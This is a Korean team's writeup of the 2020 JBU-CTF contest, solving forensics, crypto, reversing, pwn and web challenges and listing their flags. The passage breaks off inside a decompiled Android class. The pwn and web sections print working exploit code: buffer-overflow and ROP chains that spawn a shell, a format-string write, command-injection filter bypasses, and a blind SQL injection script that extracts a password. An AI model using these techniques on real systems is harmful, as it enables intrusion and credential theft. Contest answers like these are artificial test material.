# 2020 JBU-CTF Writeup

Team: 한국인터넷고등학교 19기  
Rank: 2nd (14351pts)  
Member: n1net4il (허승환), Devleo (배상혁), hanukoon (한우영)  

# MISC

## Parasite (50) - hanukoon

위에서부터 차례대로 불이 켜져있는 것을 1, 불이 꺼져있는 것을 0이라고 보고 16진수로 변환하면 된다.

`scpCTF{BABEFACE}`

---

## 누군가 정답을 알고 있어 (100) - Devleo

Benny.jpg 파일에 플래그가 있다.

`scpCTF{qUE6xpbr}`

---

## Whitespace (200) - Devleo

whitespace programming language 로 decode 하자.

`scpCTF{Y0u_Can_S33_But_Y0U_C4NT_R3AD}`

---

## Reflex (1000) - Devleo

[http://13.209.119.158:12544/](http://13.209.119.158:12544/) 이곳의 이미지가 계속해서 바뀌는데, 이미지의 텍스트를 읽어내서 형식에 맞게 nc 서버에 입력하면 된다.

```python
import cv2
import pytesseract.pytesseract
import urllib.request
import clipboard
from pwn import *

pytesseract.pytesseract.tesseract_cmd = r'C:\\Program Files\\Tesseract-OCR\\tesseract.exe'
img = urllib.request.urlopen('http://13.209.119.158:12544/image_text.jpg')
with open('./test.jpg', 'wb') as f:
    f.write(img.read())

img = cv2.imread('./test.jpg')
text = pytesseract.pytesseract.image_to_string(img)
flag = 'NOTCTF{' + ''.join(reversed(text[7:-3])) + '}'

print(flag)

p=remote("13.209.119.158", 12545)
p.recv()
p.sendline(flag)
p.interactive()
```

`scpCTF{11_voN_flddot_dhwndalr}`

---

# Forensics

## 태양권 (50) - Devleo

stegsolve 로 이미지를 열고 red plane 1에 맞추면 선명하게 플래그가 나온다.

![](2020%20JBU-CTF%20Writeup%20fc1ceb330d7c4f939934e6750bc2dd09/Untitled.png)

`scpCTF{y0u_prot3cted_t4eyan9gw0n}`

---

## Color (100) - Devleo

![](2020%20JBU-CTF%20Writeup%20fc1ceb330d7c4f939934e6750bc2dd09/Untitled%201.png)

PPT 에서 주어진 색깔 블럭들의 rgb 값을 합치고 hex to str 하면 된다.

```python
# python2
>>> "7363704354467b596f755f6630756e645f345f636f316f7221217d".decode("hex")
'scpCTF{You_f0und_4_co1or!!}'
```

`scpCTF{You_f0und_4_co1or!!}`

---

## IZ*ONE (100) - Devleo

![](2020%20JBU-CTF%20Writeup%20fc1ceb330d7c4f939934e6750bc2dd09/Untitled%202.png)

주어진 이미지의 0x0002b641 위치에 PNG file header 가 존재한다. 숨겨진 PNG 파일을 추출하고 열면 플래그가 나온다.

![](2020%20JBU-CTF%20Writeup%20fc1ceb330d7c4f939934e6750bc2dd09/Untitled%203.png)

`scpCTF{IZ*0N3_5AKUrA}`

---

## Slow Scan Television (200) - Devleo

robot36 이라는 스마트폰 앱을 활용해 플래그를 얻어냈다.

컴퓨터에서 소리를 재생시키고 robot36 앱에 들려주면 실시간으로 decode 되어 결과가 나온다.

![](2020%20JBU-CTF%20Writeup%20fc1ceb330d7c4f939934e6750bc2dd09/Untitled%204.png)

`scpCTF{I'm_Gr3at_In_sp4c3}`

---

## Find Him (200) - n1net4il

Wireshark로 HTTP 패킷을 보면 sonny의 비밀번호를 알 수 있다.

![](2020%20JBU-CTF%20Writeup%20fc1ceb330d7c4f939934e6750bc2dd09/Untitled%205.png)

`scpCTF{nOtSeCuRE!@#}`

---

## Find Msg (200) - hanukoon

패킷 파일을 받았는데 까보기 너무 귀찮아서 strings 명령어를 사용해 내부에 있는 모든 스트링을 긁어오고, 그중 scp가 포함된 문자열만 필터링 하니 플래그를 찾을 수 있었다.

![](2020%20JBU-CTF%20Writeup%20fc1ceb330d7c4f939934e6750bc2dd09/Untitled%206.png)

![](2020%20JBU-CTF%20Writeup%20fc1ceb330d7c4f939934e6750bc2dd09/Untitled%207.png)

                                                                    *~~(플래그 날먹 꺼억~)~~*

`scpCTF{U53_5FTP_P13as3}`

---

## Problem PPTX (200) - Devleo

주어진 pptx 파일을 zip으로 확장자를 바꾸고 내부를 분석해보면, /ppt/media에 flag.zip 이 있다.

flag.zip 안의 사진파일에 적힌 알파벳 하나하나를 조합하면 플래그가 된다.

![](2020%20JBU-CTF%20Writeup%20fc1ceb330d7c4f939934e6750bc2dd09/Untitled%208.png)

`scpCTF{CL3@R_PP7X_5I9N@7UR3}`

---

## Invisible Image (300) - Devleo

![](2020%20JBU-CTF%20Writeup%20fc1ceb330d7c4f939934e6750bc2dd09/Untitled%209.png)

주어진 이미지를 보면 각종 청크들과 IEND가 대소문자가 섞인 채 깨져있다.

```python
49 68 44 72 -> 49 48 44 52 (IhDr -> IHDR)
53 72 47 42 -> 73 52 47 42 (SrGB -> sRGB)
44 4E 45 49 -> 49 45 4E 44 (DNEI -> IEND)
```

![](2020%20JBU-CTF%20Writeup%20fc1ceb330d7c4f939934e6750bc2dd09/Untitled%2010.png)

그럼 이렇게 아랫부분이 잘려나간 듯한 이미지가 나오는데, PNG structure 중에 0x14~0x17 부분이 height 이므로 적절하게 늘려주면 된다.

`00 00 01 00` 을 `00 00 04 00` 로 변경하면 플래그가 나온다.

`scpCTF{Pn9_F0rm@t_is_fun!!!!}`

---

## Producer (300) - Devleo

![](2020%20JBU-CTF%20Writeup%20fc1ceb330d7c4f939934e6750bc2dd09/Untitled%2011.png)

fcrackzip -b -c a1 -v -p scp111111 -u producer.zip 으로 압축 파일 비밀번호는 scp772020 임을 알아냈다.

![](2020%20JBU-CTF%20Writeup%20fc1ceb330d7c4f939934e6750bc2dd09/Untitled%2012.png)

```bash
unzip -P scp772020 producer.zip
cat project_music/code.txt
```

code.txt를 열면 플래그가 나온다.

`scpCTF{A_G_Am_E}`

---

## Broken my Hard (500) - hanukoon

주어진 파일 중 HDD.001 파일을 binwalk로 까보면, top_secret.pdf 라는 파일을 포함하는 가진 zip archive file 이 나온다. 

![](2020%20JBU-CTF%20Writeup%20fc1ceb330d7c4f939934e6750bc2dd09/Untitled%2013.png)

![](2020%20JBU-CTF%20Writeup%20fc1ceb330d7c4f939934e6750bc2dd09/Untitled%2014.png)

해당 파일을 해제하고 top_secret.pdf를 열어보면 100장 가량의 빈 페이지가 보이고, 스크롤을 내리다 보면 플래그가 보인다 

`scpCTF{usb_is_broken}`

---

## Trace USB_2.0 (500) - hanukoon

일단 레지스트리 폴더만 따로 마운트 해서 레지스트리를 까보았다.

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR 에서 시리얼 넘버를 찾을 수 있었고,(AA00000000003937)

HKLM\SOFTWARE\Microsoft\Windows Portable Devices\Devices 에서 위에서 찾은 시리얼 넘버를 기반으로 마운트 된 드라이브 문자를 찾을 수 있었다 (E:\)

C:\Windows\inf\setupapi.dev.log 파일을 통해서, usb 연결 시간을 추출 할 수 있었다.(10/09 13:25)

![](2020%20JBU-CTF%20Writeup%20fc1ceb330d7c4f939934e6750bc2dd09/KakaoTalk_Photo_2020-11-12-12-28-22.png)

![](2020%20JBU-CTF%20Writeup%20fc1ceb330d7c4f939934e6750bc2dd09/KakaoTalk_Photo_2020-11-12-12-28-14.png)

`scpCTF{AA00000000003937_10_09_13_25_E}`

---

# Pwn

## netcat (1) - Devleo

```bash
nc 13.209.119.158 12506
```

`scpCTF{n0w_3nj0y1n9_7h3_PWN!!!}`

---

## Segmentation Fault (50) - n1net4il

Segmentation Fault가 뜨게끔 많이 입력해주면 된다.

```bash
python -c 'print "A" * 0x40' | nc 13.209.119.158 12500
```

`scpCTF{0h!_You_907_Buff3r0v3rfl0w!!!!}`

---

## Baby BOF (100) - n1net4il

요구하는 값을 위치에 맞춰서 리틀엔디언으로 넣어주면 된다.

```bash
python -c 'print "A" * 20 + "\xbe\xba\xfe\xca" + "\xef\xbe\xad\xde"' | nc 13.209.119.158 12501
```

`scpCTF{deadbeef_4nd_cafebabe}`

---

## File Descriptor (200) - n1net4il

첫번째 입력에서 입력받은 값 - 0x1337을 read() 함수의 fd로 쓴다.

표준 입력(stdin)으로 입력을 해야 하니 fd가 0이 되도록 첫번째 입력은 0x1337로 넣어준다.

그리고 위치에 맞춰서 HelloSCP!!!\n 문자열을 넣어주면 된다.

```python
from pwn import *

p = remote("13.209.119.158", 12503)

payload = str()
payload += 'A' * (0x28 - 0x14)
payload += 'HelloSCP!!!\n'

p.sendlineafter(":", str(0x1337))
p.send(payload)

p.interactive()
```

`scpCTF{Fd_0_1s_st4nDard_1nPu7}`

---

## Easy BOF (300) - n1net4il

SSP에 걸리지 않게 위치에 맞춰서 요구하는 값을 넣어주고, ret를 flag() 함수의 주소로 변조하면 된다.

```python
from pwn import *

p = remote("13.209.119.158", 12502)
e = ELF("./ret")

payload = str()
payload += 'A' * (0x34 - 0xC)
payload += p32(0xdeadbeef)
payload += p32(0xcafebabe)
payload += p32(e.sym['flag']) * 2
p.sendlineafter(":", payload)

p.interactive()
```

`scpCTF{r3t_re7_r37}`

---

## Prince_Password (400) - n1net4il

32bit RTL을 하면 된다.

```python
from pwn import *

p = remote("13.209.119.158", 12507)
e = ELF('./rtl')

payload = str()
payload += 'A' * (0x100 + 4)
payload += p32(0x080490D0) # system
payload += 'A' * 4
payload += p32(0x0804C02C) # /bin/sh

p.sendlineafter(':', payload)

p.interactive()
```

---

## Covid-19 List (500) - n1net4il

Date를 입력받는 부분에서 FSB가 터진다.

gdb로 확인해보면 스택 기준으로 26번째 위치에 for문에서 사용하는 i 변수의 주소가 저장되어 있다.

그래서 %26$n을 입력하면 i변수가 초기화되어 반복문이 더 돌게 된다.

그러면 BOF가 발생하고, 요구하는 값을 위치에 맞춰 넣어주면 된다.

```python
from pwn import *

p = remote("13.209.119.158", 12505)
e = ELF("./Covid-19")

p.sendlineafter(':', 'A')
p.sendlineafter(':', 'A')
p.sendlineafter(':', 'A')
p.sendlineafter(':', 'A')
p.sendlineafter(':', 'A')
p.sendlineafter(':', '%26$n')
p.sendlineafter(':', 'AAAA')
p.sendlineafter(':', 'BBBB')
p.sendlineafter(':', 'A' * 9 + p32(0x44434241))

p.interactive()
```

`scpCTF{C0o0o0o0o0o0o0Vid-I9}`

---

## 중부대 수강신청 프로그램 (1000) - n1net4il

admin() 함수에서 BOF가 발생한다.

이를 이용해 32bit ROP를 하면 된다.

```python
from pwn import *

p = remote("13.209.119.158", 12504)
e = ELF('/mnt/c/Users/n1net4il/Downloads/enrolment')
libc = e.libc

p.sendlineafter('>> ', str(1))
p.sendlineafter(': ', "SCPADMIN")
p.sendlineafter(': ', 'HelloWorld!')

p.sendlineafter('>> ', str(3))
p.sendlineafter('>>> ', 'A' * 19)

puts_plt = 0x401090
puts_got = 0x404018

pop_rdi_ret = 0x00000000004016a3 # pop rdi ; ret

payload = str()
payload += 'A' * (0x3B + 8)
payload += p64(pop_rdi_ret)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(e.sym['admin'])

p.sendlineafter('>>> ', payload)

leak = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
libc_base = leak - libc.sym['puts']
log.info('libc base = ' + hex(libc_base))

p.sendlineafter('>>> ', 'A' * 19)

payload = str()
payload += 'A' * (0x3B + 8)
payload += p64(pop_rdi_ret)
payload += p64(libc_base + libc.search('/bin/sh\x00').next())
payload += p64(pop_rdi_ret + 1)
payload += p64(libc_base + libc.sym['system'])
p.sendlineafter('>>> ', payload)

p.interactive()
```

`scpCTF{4dm1n_is_c4r3le55_ab0u7_4dd_3nr0l}`

---

# Crypto

## 나는 암호가 시져 (50) - Devleo

caesar cipher (key = 3)

`scpCTF{I_LOVE_TEST!!!!}`

---

## 가문의 영광 (100) - n1net4il

vigenere cipher (key = SCP)

![](2020%20JBU-CTF%20Writeup%20fc1ceb330d7c4f939934e6750bc2dd09/Untitled%2015.png)

`scpCTF{I_am_Thor.I_will_give_you_a_hammer.}`

---

## Dance Time (100) - Devleo

처음에는 human shaped dingbat 을 찾아보다가 이미지의 hex 값에 THIS_IS_DANCING_MAN_CODE_(BY_SHERLOCK_HOLMES) 문자열을 보고 아래의 이미지를 통해 decode 했다.

![](2020%20JBU-CTF%20Writeup%20fc1ceb330d7c4f939934e6750bc2dd09/Untitled%2016.png)

`scpCTF{FUNNY_CRYPT0}`

---

## 뚜두뚜두 (150) - hanukoon

[https://morsecode.world/international/decoder/audio-decoder-adaptive.htm](https://morsecode.world/international/decoder/audio-decoder-adaptive.html)l

해당사이트에 음원파일을 업로드 하여 모스부호 복호화를 하였다.

![](2020%20JBU-CTF%20Writeup%20fc1ceb330d7c4f939934e6750bc2dd09/Untitled%2017.png)

`scpCTF{1WANTT0HAV3AG1RLFR13ND}`

---

## 초대장 (200) - Devleo

hill cipher (key = {1,3,2,5} (A=0))

`scpCTF{THECONCERTVENUEISGOCHEOKDOME}`

---

## Spartan (200) - Devleo

scytale cipher (6 turns of the band)

`scpCTF{5PART4N_CH3CKP0INT}`

---

## Baby RSA (300) - n1net4il

n = p * q

phi = (p-1) * (q-1)

d = invert(e, phi)

c = m ^ e mod n

m = c ^ d mod e

위 식을 이용하면 된다.

```python
from pwn import *
from gmpy2 import *

r = remote("13.209.119.158", 12547)

# No 1
r.recvuntil("p : ")
p = int(r.recvline())

r.recvuntil("q : ")
q = int(r.recvline())

n = p * q
r.sendlineafter(":", str(n))

# No 2
r.recvuntil("p : ")
p = int(r.recvline())

r.recvuntil("q : ")
q = int(r.recvline())

phi = (p - 1) * (q - 1)
r.sendlineafter(":", str(phi))

# No 3
r.recvuntil("m : ")
m = int(r.recvline())

r.recvuntil("n : ")
n = int(r.recvline())

r.recvuntil("e : ")
e = int(r.recvline())

c = pow(m, e, n)
r.sendlineafter(":", str(c))

# No 4
r.recvuntil("p : ")
p = int(r.recvline())

r.recvuntil("q : ")
q = int(r.recvline())

r.recvuntil("e : ")
e = int(r.recvline())

phi = (p - 1) * (q - 1)
d = invert(e, phi)
r.sendlineafter(":", str(d))

# No 5
r.recvuntil("p : ")
p = int(r.recvline())

r.recvuntil("q : ")
q = int(r.recvline())

r.recvuntil("e : ")
e = int(r.recvline())

r.recvuntil("c : ")
c = int(r.recvline())

phi = (p - 1) * (q - 1)
d = invert(e, phi)
m = pow(c, d, e)
r.sendlineafter(":", str(m))

r.interactive()
```

---

## Easssy RSA (350) - n1net4il

인터넷에서 RSA decrypt하는 코드를 가져와서 돌리면 된다.

```python
# https://asecuritysite.com/encryption/rsa_d
from Crypto.PublicKey import RSA
from base64 import b64decode
import sys
from Crypto.Cipher import PKCS1_OAEP

msg = open("./ciphertext.txt").read()
privatekey = open("./mykey.pem").read()

key = RSA.import_key(privatekey)

decryptor = PKCS1_OAEP.new(key)
decrypted = decryptor.decrypt(msg)

print ("\nDecrypted: ",decrypted)
```

`scpCTF{R5A_i5_s@f3!!!}`

---

## German Army's cipher (400) - n1net4il

JHEHWWYVMRRYEWJPINGJLHIXAEYVJBFNUMCYGPCGX

위 암호문이 2020년 11월 3일자에 보내졌으면 해당 날짜의 키를 사용해 에니그마로 복호화하면 다음과 같이 나온다. (Position: AAA)

SCPSCPLOXLIDVGKHACWBAUXHHWLAIKEQBFTQTCRTV 

앞의 SCPSCP를 제거하고 Position을 SCP로 맞추면 된다.

`scpCTF{ENIGMACIPHERISVERYFUNBUTALITTLEHARD}`

---

## Broken TV (500) - n1net4il

주어진 데이터를 각각 XOR 시켜 512x512의 이미지 데이터로 그려보면 된다.

```python
import numpy as np
from PIL import Image

a = map(lambda x: x.split("], ["), open('enc.txt').read()[2:-2].split(']][['))

b = list()
for i in a:
    t = list()
    for j in i:
        t.append(tuple(map(int, j.split(', '))))
    b.append(t)

data1 = np.array(b)

a = map(lambda x: x.split("], ["), open('random.txt').read()[2:-2].split(']][['))

b = list()
for i in a:
    t = list()
    for j in i:
        t.append(tuple(map(int, j.split(', '))))
    b.append(t)
data2 = np.array(b)

img = Image.new("RGB", (512, 512))
for i in range(512):
    for j in range(512):
        img.putpixel((i, j), tuple(data1[i, j] ^ data2[i, j]))
img.save('result.png')
```

![](2020%20JBU-CTF%20Writeup%20fc1ceb330d7c4f939934e6750bc2dd09/result.png)

`scpCTF{TV_1s_XOR3d}`

---

## RSA (500) - n1net4il

e가 너무 큰 수여서 RSA Wiener Attack이 가능하다.

RSHack을 사용해서 풀면 된다.

![](2020%20JBU-CTF%20Writeup%20fc1ceb330d7c4f939934e6750bc2dd09/Untitled%2018.png)

![](2020%20JBU-CTF%20Writeup%20fc1ceb330d7c4f939934e6750bc2dd09/Untitled%2019.png)

`scpCTF{RSA_Wi3ner_C0nqu3red!}`

---

# Web

## RuleRule (50) - n1net4il

말 그대로 규칙 속에 플래그가 있다.

![](2020%20JBU-CTF%20Writeup%20fc1ceb330d7c4f939934e6750bc2dd09/Untitled%2020.png)

`scpCTF{R3m3mb3r_M3}`

---

## Fight_The_Aliens (100) - Devleo

![](2020%20JBU-CTF%20Writeup%20fc1ceb330d7c4f939934e6750bc2dd09/Untitled%2021.png)

소스를 보면 달 이미지를 클릭했을 때 flag.php 로 이동하는 것을 알 수 있다. 

![](2020%20JBU-CTF%20Writeup%20fc1ceb330d7c4f939934e6750bc2dd09/Untitled%2022.png)

`scpCTF{E4r7hi4n_N3v3r_L053}`

---

## 로그인 (100) - Devleo

소스를 보면 주석으로 0etOA-!hoJ 라는 문자열이 있는데, 이는 ascii85 encoded 된 문자열이다.

```python
>>> __import__("base64").a85decode("0etOA-!hoJ").decode("UTF-8")
'1234%^&*'
```

![](2020%20JBU-CTF%20Writeup%20fc1ceb330d7c4f939934e6750bc2dd09/Untitled%2023.png)

admin 으로 로그인 하라고 했으니 cookie 값을 위와 같이 변경하고 로그인 버튼을 누르면 플래그가 나온다.

`scpCTF{My_dream_is_C00KI3}`

---

## 하이라이트 (100) - Devleo

4번 버튼을 누르면 "윤두준의 생년월일은?" 이 나오는데 값을 입력받는 입력창이 없다.

각각의 버튼을 누르면 id 쿼리에 값이 들어가는데 이곳에 19890704를 집어넣으면 된다.

```bash
curl http://13.209.119.158:12382/index.php?id=19890704
```

`scpCTF{H1GHL1GHT_IS_TH3_L1GHT}`

---

## Command Injection1 (100) - n1net4il

입력한 command를 실행시켜준다.

```bash
; find . -name *flag*
```

위 명령어로 ./a/flag.txt가 존재한다는 것을 알았다.

```bash
; cat ./a/flag.txt
```

위 명령어로 플래그를 획득할 수 있다.

`scpCTF{Y0u_fol1ow3d_w3ll}`

---

## Balance Game (150) - Devleo

![](2020%20JBU-CTF%20Writeup%20fc1ceb330d7c4f939934e6750bc2dd09/Untitled%2024.png)

1번째 질문에서 "민트초코 우유에 첵스초코" 버튼을 누르면 다음으로 넘어가고, 주석에 플래그 앞부분이 적혀있다.

![](2020%20JBU-CTF%20Writeup%20fc1ceb330d7c4f939934e6750bc2dd09/Untitled%2025.png)

2번째 질문에서 쿠키 값에 플래그 일부가 있고, "토맛 토마토" 버튼을 누르면 다음으로 넘어간다.

![](2020%20JBU-CTF%20Writeup%20fc1ceb330d7c4f939934e6750bc2dd09/Untitled%2026.png)

3번째 질문에서 숨겨진 사진 파일에 플래그 일부가 있고, "따뜻한 파인애플" 버튼을 누르면 넘어간다.

4번째 질문의 주석을 보면 console에서 오이아이스크림 을 구하라고 되어있다.

![](2020%20JBU-CTF%20Writeup%20fc1ceb330d7c4f939934e6750bc2dd09/Untitled%2027.png)

![](2020%20JBU-CTF%20Writeup%20fc1ceb330d7c4f939934e6750bc2dd09/Untitled%2028.png)

5번째 질문의 주석에 플래그 마지막 조각이 있었고, 모두 조합하면 아래와 같다.

`scpCTF{I_l1k3_min7_ch0c0}`

---

## 청기백기 (200) - Devleo

소스를 보면 청기가 a, 백기가 b 값으로 전송되는 것을 알 수 있으므로 설명에 따라

```bash
curl -d "a=6&b=801" -X POST http://13.209.119.158:12383/bw_check.php
```

를 하면 플래그가 나온다.

`scpCTF{1_L1K3_BLUE}`

---

## 방탈출 (200) - Devleo

페이지 소스에 hehe.html 숨겨진 페이지가 있고, hehe.html 소스의 script 부분을 console에 실행시키면 된다.

![](2020%20JBU-CTF%20Writeup%20fc1ceb330d7c4f939934e6750bc2dd09/Untitled%2029.png)

`scpCTF{C4ptur3_th3_k3y}`

---

## 게시물의 행방 (250) - Devleo

디렉토리 인덱싱 취약점을 이용해 /posts/Bak_20201102/system/ 에 접근해보니

![](2020%20JBU-CTF%20Writeup%20fc1ceb330d7c4f939934e6750bc2dd09/Untitled%2030.png)

Flag 파일이 있다.

```
문제 재밌게 만들고 싶었는데 아이디어가 안 떠올라서 이정도로만 만들었습니다... 
재미 없으셨어도 여기까지 풀어주셔서 감사합니다~ 
진짜 플래그는 3번 게시물에 있어요. 푸느라 고생하셨습니다!
```

3번 게시물의 스크롤을 내려보니 플래그가 나왔다.

`scpCTF{Y0u'r3_4_9r347_W3b_H4ck3r}`

---

## (๑˃̵ᴗ˂̵) (250) - n1net4il

script 태그를 보면 난독화된 자바스크립트 코드가 있다.

역난독화시키면 다음과 같은 자바스크립트 코드가 나온다.

```jsx
var FLAG;

FLAG = "scpCTF{wPSA_{object}_asCDW}";

var object = "";

for (var i = 97; i <= 120; i+=3) {
  object +=String.fromCharCode(i);
i++
}

object
```

코드를 돌려 object를 구해서 scpCTF{wPSA_{object}_asCDW} 안에 넣으면 된다.

`scpCTF{wPSA_aeimqu_asCDW}`

---

## Command-Injection2 (400) - n1net4il

ls가 앞에 붙어 있어서 그런지

```bash
${IFS}a
```

위 명령어를 쳐서 ./a/flag.txt가 존재함을 확인할 수 있다.

또한, cat 명령어와 공백이 막혀있는 것 같아 보였다.

```bash
&&a=c&&b=at&&$a$b${IFS}./a/flag.txt
```

그래서 위와 같은 명령어로 필터링을 우회하여 플래그를 얻을 수 있다.

`scpCTF{Y0u_m4s7er_c0mm4nd1nj3c7ion}`

---

## 잠만 이거 A+ 각인데! (500) -n1net4il

Blind SQL Injection으로 비밀번호를 얻을 수 있다.

```python
import requests, warnings

warnings.filterwarnings(action='ignore')

URL = "http://13.209.119.158:12376/"

def get_pw_length():
    print("[*] Getting Password Length....")
    for i in range(1,100):
        param = {'id' : f"admin'&&length(pw)={i}#"}
        response = requests.get(URL, params=param).text
        if "correct" in response:
            print("[+] Finished!\n")
            return i
        else:
            continue
        print("[-] Failed.")
        exit(0)

def get_pw(pw_length):
    print("[*] Getting Password....")
    pw = str()
    for i in range(1,pw_length+1):
        for j in range(33,127+1):
            param = {'id' : f"admin'&&ascii(substr(pw,{i},1))='{j}'#"}
            response = requests.get(URL, params=param).text
            if "correct" in response:
                print(f"[*] Password[{i-1}] : {chr(j)}")
                pw += chr(j)
                break
    print("[+] Finished!\n")
    return pw

def main():
    print("===== Blind SQL Injection =====")
    pw_length = get_pw_length()
    print(f"[*] Password Length : {pw_length}\n")
    pw = get_pw(pw_length)
    print(f"[*] Password : {pw}\n")

if __name__ == "__main__":
    main()
```

![](2020%20JBU-CTF%20Writeup%20fc1ceb330d7c4f939934e6750bc2dd09/Untitled%2031.png)

그리고 로그인하면 플래그를 얻을 수 있다.

`scpCTF{asd2a1_ASDW_21ddwqw}`

---

# Binary

## Auth Code (100) - Devleo

![](2020%20JBU-CTF%20Writeup%20fc1ceb330d7c4f939934e6750bc2dd09/Untitled%2032.png)

ida로 decompile 하면 입력 값이 CsOcDpE 일때 플래그를 출력하는 것을 알 수 있다.

`scpCTF{R3verSing_4_Fun}`

---

## Baby Android (100) - Devleo

```java
public void onClick(View arg0) {
	if (((EditText) MainActivity.this.findViewById(C0273R.C0275id.editText1)).getText().toString().equals(new String("scpCTF{it_i5_your_fir5t4ndr0id}"))) {
	  ((TextView) MainActivity.this.findViewById(C0273R.C0275id.textView1)).setText("you are right");
	} else {
    ((TextView) MainActivity.this.findViewById(C0273R.C0275id.textView1)).setText("you are wrong");
	}
}
```

apk 파일을 decompile 하면 MainActivity 파일에 플래그가 나온다.

`scpCTF{it_i5_your_fir5t4ndr0id}`

---

## Time Bomb (100) - n1net4il

실행 파일을 x96dbg로 동적 디버깅을 해보면 입력 받은 값을 cmp 명령으로 1E21과 같은지 비교하는 부분이 나온다. 

![](2020%20JBU-CTF%20Writeup%20fc1ceb330d7c4f939934e6750bc2dd09/Untitled%2033.png)

이제 프로그램을 켜고 5초 안에 1E21, 즉, 7713을 입력해주면 된다.

`scpCTF{you_can_do_it_Fighting}`

---

## Easily Assembly (100) - n1net4il

주어진 어셈블리 파일을 열어보면 다음과 같다.

```
MAIN SEGMENT 
ASSUME CS:MAIN, DS:MAIN 

MOV AL,0
MOV DL,0

LOOP1:
ADD AL,DL
CMP DL,10
JE LOOP1_END
INC DL
JMP LOOP1
LOOP1_END: 

MOV DL,AL
MOV AH,2 
INT 21H 

MOV AH,4CH 
INT 21H 

MAIN ENDS 
END
```

간단히 분석해보면,

AL과 DL을 0으로 초기화 해주고,

DL이 10일 때까지 1씩 더해주면서 AL에 DL을 더해준다.

즉, 반복문이 끝나면 AL은 1부터 10까지의 합인 55가 들어간다.

그리고 DL에다가 AL의 값을 넣고 출력을 해준다.

즉, 정답은 55이다.

`scpCTF{55}`

---

## 범인의 노트북 (200) - n1net4il

x96dbg로 동적 디버깅을 하면 pnbs라는 문자열을 확인할 수 있다.

![](2020%20JBU-CTF%20Writeup%20fc1ceb330d7c4f939934e6750bc2dd09/Untitled%2034.png)

`scpCTF{pnbs}`

---

## Emily와 Clay의 아파트 (200) - n1net4il

Emily가 사는 층 수는 x96dbg로 동적 디버깅을 해보면 나온다.

![](2020%20JBU-CTF%20Writeup%20fc1ceb330d7c4f939934e6750bc2dd09/Untitled%2035.png)

41, 즉, 10진수로 65층이다.

그다음 Clay의 층 수를 옳게 입력했을 때 나오는 문자열을 바꾸기 위해 HxD로 바이너리를 열어서

Right, That's Clay's house! 가 나오는 부분을 수정해주면 된다.

![](2020%20JBU-CTF%20Writeup%20fc1ceb330d7c4f939934e6750bc2dd09/Untitled%2036.png)

수정 후 맨 마지막 바이트의 위치는 13A7이다.

`scpCTF{65_13A7}`

---

## What is the Password? (300) - n1net4il

주어진 c코드를 열어보면 다음과 같다.

```c
#define _CRT_SECURE_NO_WARNINGS

#include <stdio.h>
#include <string.h>

void append(char* dst, char c) {
	char* p = dst;
	while (*p != '\0') p++;
	*p = c;
	*(p + 1) = '\0';
}

int main() {

	char serial[31] = "zy]ragV9V9VllzdtjJO]hbp|o{{{::";
	char soju[31] = "";
	char macju[31] = "";

	printf("what should i do(The password is 31 letters.) \n");
	scanf_s("%s", soju);

	for (int i = 0; i < 31; i += 2) {
		append(macju, soju[i]);
	}
	for (int i = 1; i < 31; i += 2) {
		append(macju, soju[i]);
	}
	for (int i = 0; i < 31; i++) {
		macju[i] = macju[i] ^ 0o11;
	}
	int cake;
	cake = strcmp(macju, serial);
	if (cake == 0) {
		printf("G00D JoB!");
	}
	else {
		printf("try again");
	}
}
```

간단히 해석하면 입력 받은 문자열의 홀수 번째 자리의 문자들을 다 잇고, 그 뒤에 짝수 번째 자리의 문자들을 차례대로 이은 다음, 0o11과 XOR 연산하여 serial과 같으면 된다.

간단히 파이썬 코드를 짜서 serial을 역연산하자.

```python
serial = "zy]ragV9V9VllzdtjJO]hbp|o{{{::"
serial = list(map(ord, serial))
serial = list(map(lambda x: x ^ 0o11, serial))
for i in range(len(serial) // 2 + 1):
    print(chr(serial[i]), chr(serial[i + len(serial) // 2 + 1]), sep='', end='')
```

`scpCTF{Thank_y0u_f0r_revers3m3}`

---

## 동물 카드 맞추기 (400) - n1net4il

x96dbg로 동적 디버깅을 하면 암호키들을 알 수 있다.

![](2020%20JBU-CTF%20Writeup%20fc1ceb330d7c4f939934e6750bc2dd09/Untitled%2037.png)

![](2020%20JBU-CTF%20Writeup%20fc1ceb330d7c4f939934e6750bc2dd09/Untitled%2038.png)

![](2020%20JBU-CTF%20Writeup%20fc1ceb330d7c4f939934e6750bc2dd09/Untitled%2039.png)

이를 통해 암호키가 각각 777, 1A13, ECF (16진수)임을 알 수 있다.

각각의 암호키에 해당하는 동물 카드와 XOR 연산하고, 2자리씩 끊어서 10진수로 아스키 코드 변환을 하면 된다.

```python
"""
첫 번째 동물 카드: 677279
두 번째 동물 카드: 681328
세 번째 동물 카드: 66737811
"""
animals = [677279, 681328, 66737811]
keys = [0x777, 0x1A13, 0xECF]
for i in range(3):
    animal = animals[i] ^ keys[i]
    animal = str(animal)
    for i in range(0, len(animal), 2):
        print(chr(int(animal[i:i+2])), end='')
    print()
```

`scpCTF{CAT_DOG_BIRD}`

ps. 사실 암호화되기 전 동물카드를 앞 글자만으로 유추할 수도 있어요!

---

## Easssy Android (450) - n1net4il

jadx-gui로 디컴파일 해보면 다음과 같다.

```java
package com.test.android2;

import android.os.Bundle;
import android.os.Process;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import com.test.android1.R;

public class MainActivity extends AppCompatActivity {
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView((int) R.layout.activity_main);
        ((Button) findViewById(R.id.button1)).setOnClickListener(new View.OnClickListener() {
            public void onClick(View arg0) {
                String str = ((EditText) MainActivity.this.findViewById(R.id.editText1)).getText().toString();
                if (g.a(str).equals(g.a("Dontsleepwakeup"))) {
                    try {
                        if (g.c(str).equals(g.c("whysoSerious"))) {
                            ((TextView) MainActivity.this.findViewById(R.id.textView1)).setText(e.a(BuildConfig.FLAVOR));
                            return;
                        }
                        Process.killProcess(Process.myPid());
                        ((TextView) MainActivity.this.findViewById(R.id.textView1)).setText(e.a(BuildConfig.FLAVOR));
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                } else {
                    Process.killProcess(Process.myPid());
                }
            }
        });
    }
}
```

```java
package com.test.android2;

import android.util.Base64;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;

public class g {
    public static String a(String content) {
        return Base64.encodeToString(content.getBytes(), 0);
    }

    public static String b(String content) {
